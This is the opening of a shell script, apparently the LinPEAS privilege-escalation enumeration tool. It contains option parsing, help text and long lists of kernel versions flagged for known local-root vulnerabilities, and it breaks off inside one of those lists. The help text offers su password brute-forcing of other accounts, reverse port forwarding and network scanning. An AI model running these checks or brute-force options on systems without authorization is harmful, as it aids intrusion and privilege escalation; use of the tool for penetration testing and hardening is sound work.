#!/bin/sh

VERSION="ng"
ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission."

###########################################
#-------) Checks pre-everything (---------#
###########################################
if ([ -f /usr/bin/id ] && [ "$(/usr/bin/id -u)" -eq "0" ]) || [ "`whoami 2>/dev/null`" = "root" ]; then
  IAMROOT="1"
  MAXPATH_FIND_W="3"
else
  IAMROOT=""
  IAMROOT=""
  MAXPATH_FIND_W="7"
fi


###########################################
#---------------) Colors (----------------#
###########################################

C=$(printf '\033')
RED="${C}[1;31m"
SED_RED="${C}[1;31m&${C}[0m"
GREEN="${C}[1;32m"
SED_GREEN="${C}[1;32m&${C}[0m"
YELLOW="${C}[1;33m"
SED_YELLOW="${C}[1;33m&${C}[0m"
RED_YELLOW="${C}[1;31;103m"
SED_RED_YELLOW="${C}[1;31;103m&${C}[0m"
BLUE="${C}[1;34m"
SED_BLUE="${C}[1;34m&${C}[0m"
ITALIC_BLUE="${C}[1;34m${C}[3m"
LIGHT_MAGENTA="${C}[1;95m"
SED_LIGHT_MAGENTA="${C}[1;95m&${C}[0m"
LIGHT_CYAN="${C}[1;96m"
SED_LIGHT_CYAN="${C}[1;96m&${C}[0m"
LG="${C}[1;37m" #LightGray
SED_LG="${C}[1;37m&${C}[0m"
DG="${C}[1;90m" #DarkGray
SED_DG="${C}[1;90m&${C}[0m"
NC="${C}[0m"
UNDERLINED="${C}[5m"
ITALIC="${C}[3m"


###########################################
#---------) Parsing parameters (----------#
###########################################
# --) FAST - Do not check 1min of procceses and su brute
# --) SUPERFAST - FAST & do not search for special filaes in all the folders

if uname 2>/dev/null | grep -q 'Darwin' || /usr/bin/uname 2>/dev/null | grep -q 'Darwin'; then MACPEAS="1"; else MACPEAS=""; fi
FAST="1" # By default stealth/fast mode
SUPERFAST=""
DISCOVERY=""
PORTS=""
QUIET=""
CHECKS="system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex"
SEARCH_IN_FOLDER=""
ROOT_FOLDER="/"
WAIT=""
PASSWORD=""
NOCOLOR=""
DEBUG=""
AUTO_NETWORK_SCAN=""
EXTRA_CHECKS=""
REGEXES=""
PORT_FORWARD=""
THREADS=2
[ -z "$THREADS" ] && THREADS="2" # If THREADS is empty, put number 2
[ -n "$THREADS" ] && THREADS="2" # If THREADS is null, put number 2
[ "$THREADS" -eq "$THREADS" ] 2>/dev/null && : || THREADS="2" # It THREADS is not a number, put number 2
HELP=$GREEN"Enumerate and search Privilege Escalation vectors.
${NC}This tool enum and search possible misconfigurations$DG (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...)$NC inside the host and highlight possible misconfigurations with colors.
      ${GREEN}  Checks:
        ${YELLOW}    -a${BLUE} Perform all checks: 1 min of processes, su brute, and extra checks.
        ${YELLOW}    -o${BLUE} Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex). Select a comma separated list.
        ${YELLOW}    -s${BLUE} Stealth & faster (don't check some time consuming checks)
        ${YELLOW}    -e${BLUE} Perform extra enumeration
        ${YELLOW}    -t${BLUE} Automatic network scan & Internet conectivity checks - This option writes to files
        ${YELLOW}    -r${BLUE} Enable Regexes (this can take from some mins to hours)
        ${YELLOW}    -P${BLUE} Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
	${YELLOW}    -D${BLUE} Debug mode

      ${GREEN}  Network recon:
        ${YELLOW}    -t${BLUE} Automatic network scan & Internet conectivity checks - This option writes to files
	${YELLOW}    -d <IP/NETMASK>${BLUE} Discover hosts using fping or ping.$DG Ex: -d 192.168.0.1/24
        ${YELLOW}    -p <PORT(s)> -d <IP/NETMASK>${BLUE} Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports.$DG Ex: -d 192.168.0.1/24 -p 53,139
        ${YELLOW}    -i <IP> [-p <PORT(s)>]${BLUE} Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead.$DG Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
        $GREEN     Notice${BLUE} that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

      ${GREEN}  Port forwarding (reverse connection):
        ${YELLOW}    -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT${BLUE} Execute linpeas to forward a port from a your host (LOCAL_IP:LOCAL_PORT) to a remote IP (REMOTE_IP:REMOTE_PORT)

      ${GREEN}  Firmware recon:
        ${YELLOW}    -f </FOLDER/PATH>${BLUE} Execute linpeas to search passwords/file permissions misconfigs inside a folder

      ${GREEN}  Misc:
        ${YELLOW}    -h${BLUE} To show this message
	${YELLOW}    -w${BLUE} Wait execution between big blocks of checks
        ${YELLOW}    -L${BLUE} Force linpeas execution
        ${YELLOW}    -M${BLUE} Force macpeas execution
	${YELLOW}    -q${BLUE} Do not show banner
        ${YELLOW}    -N${BLUE} Do not use colours$NC"

while getopts "h?asd:p:i:P:qo:LMwNDterf:F:" opt; do
  case "$opt" in
    h|\?) printf "%s\n\n" "$HELP$NC"; exit 0;;
    a)  FAST="";EXTRA_CHECKS="1";;
    s)  SUPERFAST=1;;
    d)  DISCOVERY=$OPTARG;;
    p)  PORTS=$OPTARG;;
    i)  IP=$OPTARG;;
    P)  PASSWORD=$OPTARG;;
    q)  QUIET=1;;
    o)  CHECKS=$OPTARG;;
    L)  MACPEAS="";;
    M)  MACPEAS="1";;
    w)  WAIT=1;;
    N)  NOCOLOR="1";;
    D)  DEBUG="1";;
    t)  AUTO_NETWORK_SCAN="1"; CHECKS="network_information";;
    e)  EXTRA_CHECKS="1";;
    r)  REGEXES="1";;
    f)  SEARCH_IN_FOLDER=$OPTARG;
    	if ! [ "$(echo -n $SEARCH_IN_FOLDER | tail -c 1)" = "/" ]; then # Make sure firmware folder ends with "/"
        SEARCH_IN_FOLDER="${SEARCH_IN_FOLDER}/";
      fi;
          ROOT_FOLDER=$SEARCH_IN_FOLDER;
      REGEXES="1";
	    CHECKS="procs_crons_timers_srvcs_sockets,software_information,interesting_perms_files,interesting_files,api_keys_regex";;

    F)  PORT_FORWARD=$OPTARG;;
    esac
done

if [ "$MACPEAS" ]; then SCRIPTNAME="macpeas"; else SCRIPTNAME="linpeas"; fi
if [ "$NOCOLOR" ]; then
  C=""
  RED=""
  SED_RED="&"
  GREEN=""
  SED_GREEN="&"
  YELLOW=""
  SED_YELLOW="&"
  SED_RED_YELLOW="&"
  BLUE=""
  SED_BLUE="&"
  ITALIC_BLUE=""
  LIGHT_MAGENTA=""
  SED_LIGHT_MAGENTA="&"
  LIGHT_CYAN=""
  SED_LIGHT_CYAN="&"
  LG=""
  SED_LG="&"
  DG=""
  SED_DG="&"
  NC=""
  UNDERLINED=""
  ITALIC=""
fi

###########################################
#-----------) Starting Output (-----------#
###########################################

echo ""
if [ ! "$QUIET" ]; then print_banner; print_support; fi
echo ""
printf ${YELLOW}"ADVISORY: ${BLUE}$ADVISORY\n$NC"
echo ""
printf ${BLUE}"Linux Privesc Checklist: ${YELLOW}https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist\n"$NC
echo " LEGEND:" | sed "s,LEGEND,${C}[1;4m&${C}[0m,"
echo "  RED/YELLOW: 95% a PE vector" | sed "s,RED/YELLOW,${SED_RED_YELLOW},"
echo "  RED: You should take a look to it" | sed "s,RED,${SED_RED},"
echo "  LightCyan: Users with console" | sed "s,LightCyan,${SED_LIGHT_CYAN},"
echo "  Blue: Users without console & mounted devs" | sed "s,Blue,${SED_BLUE},"
echo "  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) " | sed "s,Green,${SED_GREEN},"
echo "  LightMagenta: Your username" | sed "s,LightMagenta,${SED_LIGHT_MAGENTA},"
if [ "$IAMROOT" ]; then
  echo ""
  echo "  YOU ARE ALREADY ROOT!!! (it could take longer to complete execution)" | sed "s,YOU ARE ALREADY ROOT!!!,${SED_RED_YELLOW},"
  sleep 3
fi
echo ""
printf " ${DG}Starting $SCRIPTNAME. Caching Writable Folders...$NC"
echo ""

###########################################
#---------------) Lists (-----------------#
###########################################

filename="$SCRIPTNAME.txt$RANDOM"
kernelB=" 4.0.[0-9]+| 4.1.[0-9]+| 4.2.[0-9]+| 4.3.[0-9]+| 4.4.[0-9]+| 4.5.[0-9]+| 4.6.[0-9]+| 4.7.[0-9]+| 4.8.[0-9]+| 4.9.[0-9]+| 4.10.[0-9]+| 4.11.[0-9]+| 4.12.[0-9]+| 4.13.[0-9]+| 3.9.6| 3.9.0| 3.9| 3.8.9| 3.8.8| 3.8.7| 3.8.6| 3.8.5| 3.8.4| 3.8.3| 3.8.2| 3.8.1| 3.8.0| 3.8| 3.7.6| 3.7.0| 3.7| 3.6.0| 3.6| 3.5.0| 3.5| 3.4.9| 3.4.8| 3.4.6| 3.4.5| 3.4.4| 3.4.3| 3.4.2| 3.4.1| 3.4.0| 3.4| 3.3| 3.2| 3.19.0| 3.16.0| 3.15| 3.14| 3.13.1| 3.13.0| 3.13| 3.12.0| 3.12| 3.11.0| 3.11| 3.10.6| 3.10.0| 3.10| 3.1.0| 3.0.6| 3.0.5| 3.0.4| 3.0.3| 3.0.2| 3.0.1| 3.0.0| 2.6.9| 2.6.8| 2.6.7| 2.6.6| 2.6.5| 2.6.4| 2.6.39| 2.6.38| 2.6.37| 2.6.36| 2.6.35| 2.6.34| 2.6.33| 2.6.32| 2.6.31| 2.6.30| 2.6.3| 2.6.29| 2.6.28| 2.6.27| 2.6.26| 2.6.25| 2.6.24.1| 2.6.24| 2.6.23| 2.6.22| 2.6.21| 2.6.20| 2.6.2| 2.6.19| 2.6.18| 2.6.17| 2.6.16| 2.6.15| 2.6.14| 2.6.13| 2.6.12| 2.6.11| 2.6.10| 2.6.1| 2.6.0| 2.4.9| 2.4.8| 2.4.7| 2.4.6| 2.4.5| 2.4.4| 2.4.37| 2.4.36| 2.4.35| 2.4.34| 2.4.33| 2.4.32| 2.4.31| 2.4.30| 2.4.29| 2.4.28| 2.4.27| 2.4.26| 2.4.25| 2.4.24| 2.4.23| 2.4.22| 2.4.21| 2.4.20| 2.4.19| 2.4.18| 2.4.17| 2.4.16| 2.4.15| 2.4.14| 2.4.13| 2.4.12| 2.4.11| 2.4.10| 2.2.24"
kernelDCW_Ubuntu_Precise_1="3.1.1-1400-linaro-lt-mx5|3.11.0-13-generic|3.11.0-14-generic|3.11.0-15-generic|3.11.0-17-generic|3.11.0-18-generic|3.11.0-20-generic|3.11.0-22-generic|3.11.0-23-generic|3.11.0-24-generic|3.11.0-26-generic|3.13.0-100-generic|3.13.0-24-generic|3.13.0-27-generic|3.13.0-29-generic|3.13.0-30-generic|3.13.0-32-generic|3.13.0-33-generic|3.13.0-34-generic|3.13.0-35-generic|3.13.0-36-generic|3.13.0-37-generic|3.13.0-39-generic|3.13.0-40-generic|3.13.0-41-generic|3.13.0-43-generic|3.13.0-44-generic|3.13.0-46-generic|3.13.0-48-generic|3.13.0-49-generic|3.13.0-51-generic|3.13.0-52-generic|3.13.0-53-generic|3.13.0-54-generic|3.13.0-55-generic|3.13.0-57-generic|3.13.0-58-generic|3.13.0-59-generic|3.13.0-61-generic|3.13.0-62-generic|3.13.0-63-generic|3.13.0-65-generic|3.13.0-66-generic|3.13.0-67-generic|3.13.0-68-generic|3.13.0-71-generic|3.13.0-73-generic|3.13.0-74-generic|3.13.0-76-generic|3.13.0-77-generic|3.13.0-79-generic|3.13.0-83-generic|3.13.0-85-generic|3.13.0-86-generic|3.13.0-88-generic|3.13.0-91-generic|3.13.0-92-generic|3.13.0-93-generic|3.13.0-95-generic|3.13.0-96-generic|3.13.0-98-generic|3.2.0-101-generic|3.2.0-101-generic-pae|3.2.0-101-virtual|3.2.0-102-generic|3.2.0-102-generic-pae|3.2.0-102-virtual"
kernelDCW_Ubuntu_Precise_2="3.2.0-104-generic|3.2.0-104-generic-pae|3.2.0-104-virtual|3.2.0-105-generic|3.2.0-105-generic-pae|3.2.0-105-virtual|3.2.0-106-generic|3.2.0-106-generic-pae|3.2.0-106-virtual|3.2.0-107-generic|3.2.0-107-generic-pae|3.2.0-107-virtual|3.2.0-109-generic|3.2.0-109-generic-pae|3.2.0-109-virtual|3.2.0-110-generic|3.2.0-110-generic-pae|3.2.0-110-virtual|3.2.0-111-generic|3.2.0-111-generic-pae|3.2.0-111-virtual|3.2.0-1412-omap4|3.2.0-1602-armadaxp|3.2.0-23-generic|3.2.0-23-generic-pae|3.2.0-23-lowlatency|3.2.0-23-lowlatency-pae|3.2.0-23-omap|3.2.0-23-powerpc-smp|3.2.0-23-powerpc64-smp|3.2.0-23-virtual|3.2.0-24-generic|3.2.0-24-generic-pae|3.2.0-24-virtual|3.2.0-25-generic|3.2.0-25-generic-pae|3.2.0-25-virtual|3.2.0-26-generic|3.2.0-26-generic-pae|3.2.0-26-virtual|3.2.0-27-generic|3.2.0-27-generic-pae|3.2.0-27-virtual|3.2.0-29-generic|3.2.0-29-generic-pae|3.2.0-29-virtual|3.2.0-31-generic|3.2.0-31-generic-pae|3.2.0-31-virtual|3.2.0-32-generic|3.2.0-32-generic-pae|3.2.0-32-virtual|3.2.0-33-generic|3.2.0-33-generic-pae|3.2.0-33-lowlatency|3.2.0-33-lowlatency-pae|3.2.0-33-virtual|3.2.0-34-generic|3.2.0-34-generic-pae|3.2.0-34-virtual|3.2.0-35-generic|3.2.0-35-generic-pae|3.2.0-35-lowlatency|3.2.0-35-lowlatency-pae|3.2.0-35-virtual"
kernelDCW_Ubuntu_Precise_3="3.2.0-36-generic|3.2.0-36-generic-pae|3.2.0-36-lowlatency|3.2.0-36-lowlatency-pae|3.2.0-36-virtual|3.2.0-37-generic|3.2.0-37-generic-pae|3.2.0-37-lowlatency|3.2.0-37-lowlatency-pae|3.2.0-37-virtual|3.2.0-38-generic|3.2.0-38-generic-pae|3.2.0-38-lowlatency|3.2.0-38-lowlatency-pae|3.2.0-38-virtual|3.2.0-39-generic|3.2.0-39-generic-pae|3.2.0-39-lowlatency|3.2.0-39-lowlatency-pae|3.2.0-39-virtual|3.2.0-40-generic|3.2.0-40-generic-pae|3.2.0-40-lowlatency|3.2.0-40-lowlatency-pae|3.2.0-40-virtual|3.2.0-41-generic|3.2.0-41-generic-pae|3.2.0-41-lowlatency|3.2.0-41-lowlatency-pae|3.2.0-41-virtual|3.2.0-43-generic|3.2.0-43-generic-pae|3.2.0-43-virtual|3.2.0-44-generic|3.2.0-44-generic-pae|3.2.0-44-lowlatency|3.2.0-44-lowlatency-pae|3.2.0-44-virtual|3.2.0-45-generic|3.2.0-45-generic-pae|3.2.0-45-virtual|3.2.0-48-generic|3.2.0-48-generic-pae|3.2.0-48-lowlatency|3.2.0-48-lowlatency-pae|3.2.0-48-virtual|3.2.0-51-generic|3.2.0-51-generic-pae|3.2.0-51-lowlatency|3.2.0-51-lowlatency-pae|3.2.0-51-virtual|3.2.0-52-generic|3.2.0-52-generic-pae|3.2.0-52-lowlatency|3.2.0-52-lowlatency-pae|3.2.0-52-virtual|3.2.0-53-generic"
kernelDCW_Ubuntu_Precise_4="3.2.0-53-generic-pae|3.2.0-53-lowlatency|3.2.0-53-lowlatency-pae|3.2.0-53-virtual|3.2.0-54-generic|3.2.0-54-generic-pae|3.2.0-54-lowlatency|3.2.0-54-lowlatency-pae|3.2.0-54-virtual|3.2.0-55-generic|3.2.0-55-generic-pae|3.2.0-55-lowlatency|3.2.0-55-lowlatency-pae|3.2.0-55-virtual|3.2.0-56-generic|3.2.0-56-generic-pae|3.2.0-56-lowlatency|3.2.0-56-lowlatency-pae|3.2.0-56-virtual|3.2.0-57-generic|3.2.0-57-generic-pae|3.2.0-57-lowlatency|3.2.0-57-lowlatency-pae|3.2.0-57-virtual|3.2.0-58-generic|3.2.0-58-generic-pae|3.2.0-58-lowlatency|3.2.0-58-lowlatency-pae|3.2.0-58-virtual|3.2.0-59-generic|3.2.0-59-generic-pae|3.2.0-59-lowlatency|3.2.0-59-lowlatency-pae|3.2.0-59-virtual|3.2.0-60-generic|3.2.0-60-generic-pae|3.2.0-60-lowlatency|3.2.0-60-lowlatency-pae|3.2.0-60-virtual|3.2.0-61-generic|3.2.0-61-generic-pae|3.2.0-61-virtual|3.2.0-63-generic|3.2.0-63-generic-pae|3.2.0-63-lowlatency|3.2.0-63-lowlatency-pae|3.2.0-63-virtual|3.2.0-64-generic|3.2.0-64-generic-pae|3.2.0-64-lowlatency|3.2.0-64-lowlatency-pae|3.2.0-64-virtual|3.2.0-65-generic|3.2.0-65-generic-pae|3.2.0-65-lowlatency|3.2.0-65-lowlatency-pae|3.2.0-65-virtual|3.2.0-67-generic|3.2.0-67-generic-pae|3.2.0-67-lowlatency|3.2.0-67-lowlatency-pae|3.2.0-67-virtual|3.2.0-68-generic"
kernelDCW_Ubuntu_Precise_5="3.2.0-68-generic-pae|3.2.0-68-lowlatency|3.2.0-68-lowlatency-pae|3.2.0-68-virtual|3.2.0-69-generic|3.2.0-69-generic-pae|3.2.0-69-lowlatency|3.2.0-69-lowlatency-pae|3.2.0-69-virtual|3.2.0-70-generic|3.2.0-70-generic-pae|3.2.0-70-lowlatency|3.2.0-70-lowlatency-pae|3.2.0-70-virtual|3.2.0-72-generic|3.2.0-72-generic-pae|3.2.0-72-lowlatency|3.2.0-72-lowlatency-pae|3.2.0-72-virtual|3.2.0-73-generic|3.2.0-73-generic-pae|3.2.0-73-lowlatency|3.2.0-73-lowlatency-pae|3.2.0-73-virtual|3.2.0-74-generic|3.2.0-74-generic-pae|3.2.0-74-lowlatency|3.2.0-74-lowlatency-pae|3.2.0-74-virtual|3.2.0-75-generic|3.2.0-75-generic-pae|3.2.0-75-lowlatency|3.2.0-75-lowlatency-pae|3.2.0-75-virtual|3.2.0-76-generic|3.2.0-76-generic-pae|3.2.0-76-lowlatency|3.2.0-76-lowlatency-pae|3.2.0-76-virtual|3.2.0-77-generic|3.2.0-77-generic-pae|3.2.0-77-lowlatency|3.2.0-77-lowlatency-pae|3.2.0-77-virtual|3.2.0-79-generic|3.2.0-79-generic-pae|3.2.0-79-lowlatency|3.2.0-79-lowlatency-pae|3.2.0-79-virtual|3.2.0-80-generic|3.2.0-80-generic-pae|3.2.0-80-lowlatency|3.2.0-80-lowlatency-pae|3.2.0-80-virtual|3.2.0-82-generic|3.2.0-82-generic-pae|3.2.0-82-lowlatency|3.2.0-82-lowlatency-pae|3.2.0-82-virtual|3.2.0-83-generic|3.2.0-83-generic-pae|3.2.0-83-virtual|3.2.0-84-generic"
kernelDCW_Ubuntu_Precise_6="3.2.0-84-generic-pae|3.2.0-84-virtual|3.2.0-85-generic|3.2.0-85-generic-pae|3.2.0-85-virtual|3.2.0-86-generic|3.2.0-86-generic-pae|3.2.0-86-virtual|3.2.0-87-generic|3.2.0-87-generic-pae|3.2.0-87-virtual|3.2.0-88-generic|3.2.0-88-generic-pae|3.2.0-88-virtual|3.2.0-89-generic|3.2.0-89-generic-pae|3.2.0-89-virtual|3.2.0-90-generic|3.2.0-90-generic-pae|3.2.0-90-virtual|3.2.0-91-generic|3.2.0-91-generic-pae|3.2.0-91-virtual|3.2.0-92-generic|3.2.0-92-generic-pae|3.2.0-92-virtual|3.2.0-93-generic|3.2.0-93-generic-pae|3.2.0-93-virtual|3.2.0-94-generic|3.2.0-94-generic-pae|3.2.0-94-virtual|3.2.0-95-generic|3.2.0-95-generic-pae|3.2.0-95-virtual|3.2.0-96-generic|3.2.0-96-generic-pae|3.2.0-96-virtual|3.2.0-97-generic|3.2.0-97-generic-pae|3.2.0-97-virtual|3.2.0-98-generic|3.2.0-98-generic-pae|3.2.0-98-virtual|3.2.0-99-generic|3.2.0-99-generic-pae|3.2.0-99-virtual|3.5.0-40-generic|3.5.0-41-generic|3.5.0-42-generic|3.5.0-43-generic|3.5.0-44-generic|3.5.0-45-generic|3.5.0-46-generic|3.5.0-49-generic|3.5.0-51-generic|3.5.0-52-generic|3.5.0-54-generic|3.8.0-19-generic|3.8.0-21-generic|3.8.0-22-generic|3.8.0-23-generic|3.8.0-27-generic|3.8.0-29-generic|3.8.0-30-generic|3.8.0-31-generic|3.8.0-32-generic|3.8.0-33-generic|3.8.0-34-generic|3.8.0-35-generic|3.8.0-36-generic|3.8.0-37-generic|3.8.0-38-generic|3.8.0-39-generic|3.8.0-41-generic|3.8.0-42-generic"
kernelDCW_Ubuntu_Trusty_1="3.13.0-24-generic|3.13.0-24-generic-lpae|3.13.0-24-lowlatency|3.13.0-24-powerpc-e500|3.13.0-24-powerpc-e500mc|3.13.0-24-powerpc-smp|3.13.0-24-powerpc64-emb|3.13.0-24-powerpc64-smp|3.13.0-27-generic|3.13.0-27-lowlatency|3.13.0-29-generic|3.13.0-29-lowlatency|3.13.0-3-exynos5|3.13.0-30-generic|3.13.0-30-lowlatency|3.13.0-32-generic|3.13.0-32-lowlatency|3.13.0-33-generic|3.13.0-33-lowlatency|3.13.0-34-generic|3.13.0-34-lowlatency|3.13.0-35-generic|3.13.0-35-lowlatency|3.13.0-36-generic|3.13.0-36-lowlatency|3.13.0-37-generic|3.13.0-37-lowlatency|3.13.0-39-generic|3.13.0-39-lowlatency|3.13.0-40-generic|3.13.0-40-lowlatency|3.13.0-41-generic|3.13.0-41-lowlatency|3.13.0-43-generic|3.13.0-43-lowlatency|3.13.0-44-generic|3.13.0-44-lowlatency|3.13.0-46-generic|3.13.0-46-lowlatency|3.13.0-48-generic|3.13.0-48-lowlatency|3.13.0-49-generic|3.13.0-49-lowlatency|3.13.0-51-generic|3.13.0-51-lowlatency|3.13.0-52-generic|3.13.0-52-lowlatency|3.13.0-53-generic|3.13.0-53-lowlatency|3.13.0-54-generic|3.13.0-54-lowlatency|3.13.0-55-generic|3.13.0-55-lowlatency|3.13.0-57-generic|3.13.0-57-lowlatency|3.13.0-58-generic|3.13.0-58-lowlatency|3.13.0-59-generic|3.13.0-59-lowlatency|3.13.0-61-generic|3.13.0-61-lowlatency|3.13.0-62-generic|3.13.0-62-lowlatency|3.13.0-63-generic|3.13.0-63-lowlatency|3.13.0-65-generic|3.13.0-65-lowlatency|3.13.0-66-generic|3.13.0-66-lowlatency"
kernelDCW_Ubuntu_Trusty_2="3.13.0-67-generic|3.13.0-67-lowlatency|3.13.0-68-generic|3.13.0-68-lowlatency|3.13.0-70-generic|3.13.0-70-lowlatency|3.13.0-71-generic|3.13.0-71-lowlatency|3.13.0-73-generic|3.13.0-73-lowlatency|3.13.0-74-generic|3.13.0-74-lowlatency|3.13.0-76-generic|3.13.0-76-lowlatency|3.13.0-77-generic|3.13.0-77-lowlatency|3.13.0-79-generic|3.13.0-79-lowlatency|3.13.0-83-generic|3.13.0-83-lowlatency|3.13.0-85-generic|3.13.0-85-lowlatency|3.13.0-86-generic|3.13.0-86-lowlatency|3.13.0-87-generic|3.13.0-87-lowlatency|3.13.0-88-generic|3.13.0-88-lowlatency|3.13.0-91-generic|3.13.0-91-lowlatency|3.13.0-92-generic|3.13.0-92-lowlatency|3.13.0-93-generic|3.13.0-93-lowlatency|3.13.0-95-generic|3.13.0-95-lowlatency|3.13.0-96-generic|3.13.0-96-lowlatency|3.13.0-98-generic|3.13.0-98-lowlatency|3.16.0-25-generic|3.16.0-25-lowlatency|3.16.0-26-generic|3.16.0-26-lowlatency|3.16.0-28-generic|3.16.0-28-lowlatency|3.16.0-29-generic|3.16.0-29-lowlatency|3.16.0-31-generic|3.16.0-31-lowlatency|3.16.0-33-generic|3.16.0-33-lowlatency|3.16.0-34-generic|3.16.0-34-lowlatency|3.16.0-36-generic|3.16.0-36-lowlatency|3.16.0-37-generic|3.16.0-37-lowlatency|3.16.0-38-generic|3.16.0-38-lowlatency|3.16.0-39-generic|3.16.0-39-lowlatency|3.16.0-41-generic|3.16.0-41-lowlatency|3.16.0-43-generic|3.16.0-43-lowlatency|3.16.0-44-generic|3.16.0-44-lowlatency|3.16.0-45-generic"
kernelDCW_Ubuntu_Trusty_3="3.16.0-45-lowlatency|3.16.0-46-generic|3.16.0-46-lowlatency|3.16.0-48-generic|3.16.0-48-lowlatency|3.16.0-49-generic|3.16.0-49-lowlatency|3.16.0-50-generic|3.16.0-50-lowlatency|3.16.0-51-generic|3.16.0-51-lowlatency|3.16.0-52-generic|3.16.0-52-lowlatency|3.16.0-53-generic|3.16.0-53-lowlatency|3.16.0-55-generic|3.16.0-55-lowlatency|3.16.0-56-generic|3.16.0-56-lowlatency|3.16.0-57-generic|3.16.0-57-lowlatency|3.16.0-59-generic|3.16.0-59-lowlatency|3.16.0-60-generic|3.16.0-60-lowlatency|3.16.0-62-generic|3.16.0-62-lowlatency|3.16.0-67-generic|3.16.0-67-lowlatency|3.16.0-69-generic|3.16.0-69-lowlatency|3.16.0-70-generic|3.16.0-70-lowlatency|3.16.0-71-generic|3.16.0-71-lowlatency|3.16.0-73-generic|3.16.0-73-lowlatency|3.16.0-76-generic|3.16.0-76-lowlatency|3.16.0-77-generic|3.16.0-77-lowlatency|3.19.0-20-generic|3.19.0-20-lowlatency|3.19.0-21-generic|3.19.0-21-lowlatency|3.19.0-22-generic|3.19.0-22-lowlatency|3.19.0-23-generic|3.19.0-23-lowlatency|3.19.0-25-generic|3.19.0-25-lowlatency|3.19.0-26-generic|3.19.0-26-lowlatency|3.19.0-28-generic|3.19.0-28-lowlatency|3.19.0-30-generic|3.19.0-30-lowlatency|3.19.0-31-generic|3.19.0-31-lowlatency|3.19.0-32-generic|3.19.0-32-lowlatency|3.19.0-33-generic|3.19.0-33-lowlatency|3.19.0-37-generic|3.19.0-37-lowlatency|3.19.0-39-generic|3.19.0-39-lowlatency|3.19.0-41-generic|3.19.0-41-lowlatency|3.19.0-42-generic"
kernelDCW_Ubuntu_Trusty_4="3.19.0-42-lowlatency|3.19.0-43-generic|3.19.0-43-lowlatency|3.19.0-47-generic|3.19.0-47-lowlatency|3.19.0-49-generic|3.19.0-49-lowlatency|3.19.0-51-generic|3.19.0-51-lowlatency|3.19.0-56-generic|3.19.0-56-lowlatency|3.19.0-58-generic|3.19.0-58-lowlatency|3.19.0-59-generic|3.19.0-59-lowlatency|3.19.0-61-generic|3.19.0-61-lowlatency|3.19.0-64-generic|3.19.0-64-lowlatency|3.19.0-65-generic|3.19.0-65-lowlatency|3.19.0-66-generic|3.19.0-66-lowlatency|3.19.0-68-generic|3.19.0-68-lowlatency|3.19.0-69-generic|3.19.0-69-lowlatency|3.19.0-71-generic|3.19.0-71-lowlatency|3.4.0-5-chromebook|4.2.0-18-generic|4.2.0-18-lowlatency|4.2.0-19-generic|4.2.0-19-lowlatency|4.2.0-21-generic|4.2.0-21-lowlatency|4.2.0-22-generic|4.2.0-22-lowlatency|4.2.0-23-generic|4.2.0-23-lowlatency|4.2.0-25-generic|4.2.0-25-lowlatency|4.2.0-27-generic|4.2.0-27-lowlatency|4.2.0-30-generic|4.2.0-30-lowlatency|4.2.0-34-generic|4.2.0-34-lowlatency|4.2.0-35-generic|4.2.0-35-lowlatency|4.2.0-36-generic|4.2.0-36-lowlatency|4.2.0-38-generic|4.2.0-38-lowlatency|4.2.0-41-generic|4.2.0-41-lowlatency|4.4.0-21-generic|4.4.0-21-lowlatency|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
kernelDCW_Ubuntu_Xenial="4.4.0-1009-raspi2|4.4.0-1012-snapdragon|4.4.0-21-generic|4.4.0-21-generic-lpae|4.4.0-21-lowlatency|4.4.0-21-powerpc-e500mc|4.4.0-21-powerpc-smp|4.4.0-21-powerpc64-emb|4.4.0-21-powerpc64-smp|4.4.0-22-generic|4.4.0-22-lowlatency|4.4.0-24-generic|4.4.0-24-lowlatency|4.4.0-28-generic|4.4.0-28-lowlatency|4.4.0-31-generic|4.4.0-31-lowlatency|4.4.0-34-generic|4.4.0-34-lowlatency|4.4.0-36-generic|4.4.0-36-lowlatency|4.4.0-38-generic|4.4.0-38-lowlatency|4.4.0-42-generic|4.4.0-42-lowlatency"
kernelDCW_Rhel5_1="2.6.24.7-74.el5rt|2.6.24.7-81.el5rt|2.6.24.7-93.el5rt|2.6.24.7-101.el5rt|2.6.24.7-108.el5rt|2.6.24.7-111.el5rt|2.6.24.7-117.el5rt|2.6.24.7-126.el5rt|2.6.24.7-132.el5rt|2.6.24.7-137.el5rt|2.6.24.7-139.el5rt|2.6.24.7-146.el5rt|2.6.24.7-149.el5rt|2.6.24.7-161.el5rt|2.6.24.7-169.el5rt|2.6.33.7-rt29.45.el5rt|2.6.33.7-rt29.47.el5rt|2.6.33.7-rt29.55.el5rt|2.6.33.9-rt31.64.el5rt|2.6.33.9-rt31.67.el5rt|2.6.33.9-rt31.86.el5rt|2.6.18-8.1.1.el5|2.6.18-8.1.3.el5|2.6.18-8.1.4.el5|2.6.18-8.1.6.el5|2.6.18-8.1.8.el5|2.6.18-8.1.10.el5|2.6.18-8.1.14.el5|2.6.18-8.1.15.el5|2.6.18-53.el5|2.6.18-53.1.4.el5|2.6.18-53.1.6.el5|2.6.18-53.1.13.el5|2.6.18-53.1.14.el5|2.6.18-53.1.19.el5|2.6.18-53.1.21.el5|2.6.18-92.el5|2.6.18-92.1.1.el5|2.6.18-92.